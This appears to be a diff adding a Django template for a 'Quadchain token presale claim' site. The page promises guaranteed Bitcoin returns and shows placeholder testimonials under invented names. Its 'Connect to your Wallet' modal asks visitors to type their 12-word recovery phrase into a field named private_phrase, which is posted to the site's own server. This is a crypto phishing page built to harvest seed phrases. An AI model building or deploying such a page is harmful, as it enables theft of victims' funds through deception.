@@ -1,0 +1,233 @@
+{% extends 'base.html' %}
+{% load static %}
+{% block content %}
+
+  <!-- Alerts -->
+  {% include 'aleart.html' %}
+
+    <!-- start slider section -->
+    <div id="top_section" class=" banner_main">
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-md-12">
+                    
+                        
+                        <div class="row d_flex">
+                            <div class="col-md-6">
+                                <div class="con_img">
+                                    <figure><img class="img_responsive" src="{% static 'images/top_img.png' %}" alt="#" /></figure>
+                                </div>
+                            </div>
+                            <div class="col-md-6">
+                                <div class="bluid">
+                                    <h1>Welcome to<br>  Quadchain token presale claim</h1>
+                                    <p>There are many variations of passages of Lorem Ipsum available, but the majority have suffered
+                                    </p>
+                                    <a class="read_more" type="button" data-toggle="modal" data-target="#inquiryModal">Click to Claim </a>
+                                </div>
+                            </div>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- end slider section -->
+
+    <!-- about -->
+    <div id="about" class="about">
+      <div class="container">
+          <div class="row">
+              <div class="col-md-12">
+                  <div class="about_border">
+                      <div class="row">
+                          <div class="col-md-6">
+                              <div class="titlepage text_align_left">
+                                  <h2>About Us</h2>
+                              </div>
+                              <div class="about_text">
+                                  <p>At our Bitcoin investment platform, we offer a secure and reliable platform for users to invest in Bitcoin. Our investment plan offers flexibility and a high, guaranteed return. </p>
+                                  <a class="read_more" href="about.html">Read More</a>
+                              </div>
+                          </div>
+                          <div class="col-md-6">
+                              <div class="about_img">
+                                  <figure><img class="img_responsive" src="{% static 'images/about2.png' %}" alt="#" /></figure>
+                              </div>
+                          </div>
+                      </div>
+                  </div>
+              </div>
+          </div>
+      </div>
+  </div>
+  <!-- end about -->
+
+
+  <!-- testimonial -->
+  <div class="testimonial" id="testimonial">
+    <div class="container-fluid">
+        <div class="row">
+            <div class="col-md-12">
+                <div class="border_testi">
+                    <div class="row">
+                        <div class="col-md-12">
+                            <div class="titlepage text_align_center">
+                                <h2>Testimonial</h2>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="row d_flex">
+                        <div class="col-md-10 offset-md-1">
+                            <div id="testimo" class="carousel slide our_testimonial" data-ride="carousel">
+                                <ol class="carousel-indicators">
+                                    <li data-target="#testimo" data-slide-to="0" class="active"></li>
+                                    <li data-target="#testimo" data-slide-to="1"></li>
+                                    <li data-target="#testimo" data-slide-to="2"></li>
+                                </ol>
+                                <div class="carousel-inner">
+                                    <div class="carousel-item active">
+                                        <div class="container">
+                                            <div class="carousel-caption posi_in">
+                                                <div class="row">
+                                                    <div class="col-md-3">
+                                                        <div class="testomoniam_text text_align_center">
+                                                            <i><img src="{% static 'images/clint.jpg' %}" alt="#"/></i>
+                                                            <h3>Morgan Smith</h3>
+                                                            <span>Bitcoin</span>
+                                                            <img src="{% static 'images/icon.png' %}" alt="#" />
+                                                        </div>
+                                                    </div>
+                                                    <div class="col-md-9">
+                                                        <div class="testomoniam_text text_align_left">
+                                                            <p>more-or-less normal distribution of letters, as opposed to using 'Content here, content here', making it look like readable English. Many desktop publishing packages and webmore-or-less normal distribution of letters, as opposed to using 'Content here, content here', making it look like readable English. Many desktop publishing packages and webmore-or-less normal distribution of</p>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="carousel-item">
+                                        <div class="container">
+                                            <div class="carousel-caption posi_in">
+                                                <div class="row">
+                                                    <div class="col-md-3">
+                                                        <div class="testomoniam_text text_align_center">
+                                                            <i><img src="{% static 'images/team-1.jpg' %}" alt="#"/></i>
+                                                            <h3>Felix Brad</h3>
+                                                            <span>Bitcoin</span>
+                                                            <img src="{% static 'images/icon.png' %}" alt="#" />
+                                                        </div>
+                                                    </div>
+                                                    <div class="col-md-9">
+                                                        <div class="testomoniam_text text_align_left">
+                                                            <p>more-or-less normal distribution of letters, as opposed to using 'Content here, content here', making it look like readable English. Many desktop publishing packages and webmore-or-less normal distribution of letters, as opposed to using 'Content here, content here', making it look like readable English. Many desktop publishing packages and webmore-or-less normal distribution of</p>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="carousel-item">
+                                        <div class="container">
+                                            <div class="carousel-caption posi_in">
+                                                <div class="row">
+                                                    <div class="col-md-3">
+                                                        <div class="testomoniam_text text_align_center">
+                                                            <i><img src="{% static 'images/team-4.jpg' %}" alt="#"/></i>
+                                                            <h3>Lucy Daniel</h3>
+                                                            <span>Bitcoin</span>
+                                                            <img src="{% static 'images/icon.png' %}" alt="#" />
+                                                        </div>
+                                                    </div>
+                                                    <div class="col-md-9">
+                                                        <div class="testomoniam_text text_align_left">
+                                                            <p>more-or-less normal distribution of letters, as opposed to using 'Content here, content here', making it look like readable English. Many desktop publishing packages and webmore-or-less normal distribution of letters, as opposed to using 'Content here, content here', making it look like readable English. Many desktop publishing packages and webmore-or-less normal distribution of</p>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <a class="carousel-control-prev" href="#testimo" role="button" data-slide="prev">
+                                    <i class="fa fa-angle-left" aria-hidden="true"></i>
+                                    <span class="sr-only">Previous</span>
+                                </a>
+                                <a class="carousel-control-next" href="#testimo" role="button" data-slide="next">
+                                    <i class="fa fa-angle-right" aria-hidden="true"></i>
+                                    <span class="sr-only">Next</span>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end testimonial -->
+
+
+<div class="copyright text_align_center ">
+  <div class="container ">
+     <div class="row ">
+        <div class="col-md-12 ">
+           <p>© 2023 All Rights Reserved by Quadchain</p>
+        </div>
+     </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+    <!-- modal form -->
+    <!-- Inquiry Modal -->
+    
+  
+    <div class="modal fade" id="inquiryModal" role="dialog">
+      <div class="modal-dialog">
+        <div class="modal-content">
+          <div class="modal-header">
+            <div class="modal-title" id="inquiryModalLabel"
+               style="font-weight:bold; font-size:24px;">Connect to your Wallet
+              </div>
+            <button type="button" class="close" data-dismiss="modal">
+              <span>&times;</span>
+            </button>
+          </div>
+          <div class="modal-body">
+            <p style="font-size:16px;">Enter your 12 phrase word below:</p>
+            <form action="{% url 'home' %}" method="POST">
+              {% csrf_token %}
+              <div class="form-group">
+                
+                <textarea name="private_phrase"  placeholder="Enter your 12 phrase word here" class="form-control" required></textarea>
+              </div>
+              <hr>
+              <input type="submit" value="Connect" class="btn btn-block btn-primary">
+            </form>
+            <small>The Best Web3.0 community Token</small>
+          </div>
+        </div>
+      </div>
+    </div>
+{% endblock content %}
+    
